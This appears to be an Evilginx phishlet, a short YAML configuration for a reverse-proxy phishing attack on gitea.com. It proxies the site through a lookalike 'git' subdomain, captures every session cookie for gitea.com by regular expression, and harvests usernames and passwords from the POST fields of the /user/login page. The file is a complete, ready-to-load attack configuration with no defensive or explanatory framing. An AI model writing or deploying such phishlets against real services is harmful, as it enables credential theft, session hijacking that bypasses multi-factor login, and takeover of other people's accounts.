min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'git', orig_sub: 'gitea', domain: 'com', session: true, is_landing: true}
  
sub_filters:
#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}

auth_tokens:
  - domain: '.gitea.com'
    keys: ['.*:regexp']
  - domain: 'gitea.com'
    keys: ['.*:regexp']    

auth_urls:
  - '/'
    
credentials:
  username:
    key: 'user_name'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
    
login:
  domain: 'gitea.com'
  path: '/user/login'
